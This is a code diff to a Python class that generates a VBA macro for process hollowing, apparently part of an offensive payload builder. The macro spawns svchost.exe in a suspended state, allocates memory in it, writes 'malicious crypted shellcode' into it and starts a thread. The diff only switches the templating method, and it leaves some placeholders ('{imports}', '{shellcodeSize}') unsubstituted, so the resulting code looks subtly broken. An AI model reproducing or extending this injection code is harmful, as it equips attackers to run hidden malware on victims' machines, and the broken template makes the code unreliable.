@@ -1,3 +1,5 @@
+from string import Template
+
 class spawnandinject:
     def __init__(self, arguments):
         self.memoryPermission = '&H20'
@@ -19,8 +21,8 @@ class spawnandinject:
     def compilerOptions(self) -> list[str]:
         return []
 
-    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
-        return f"""
+    def template(self) -> str:
+        return Template("""
 {imports}
 
 Private Type PROCESS_BASIC_INFORMATION
@@ -79,7 +81,7 @@ Function hollow()
     Dim pi As PROCESS_INFORMATION
     Dim procOutput As LongPtr
     ' Start svchost.exe in a suspended state
-    procOutput = CreateProcessA(vbNullString, "{self.target}", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)    
+    procOutput = CreateProcessA(vbNullString, "$target", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)    
     
     ' Buffer for malicious crypted shellcode needs to go here
     Dim shellcode As Variant
@@ -96,7 +98,7 @@ Function hollow()
 
     Dim addr as LongPtr
 
-    addr = VirtualAllocEx(pi.hProcess, ByVal 0&, {shellcodeSize},  &H3000, {self.memoryPermission})
+    addr = VirtualAllocEx(pi.hProcess, ByVal 0&, {shellcodeSize},  &H3000, $memoryPermission)
 
     ' Write the shellcode into the svchost.exe entry point
     a = WriteProcessMemory(pi.hProcess, addr, buf(0), scSize, tmp)
@@ -107,4 +109,4 @@ Function hollow()
     b = WaitForSingleObject(thread, 500)
  
 End Function
-"""
+""").substitute(target=self.target, memoryPermission=self.memoryPermission)
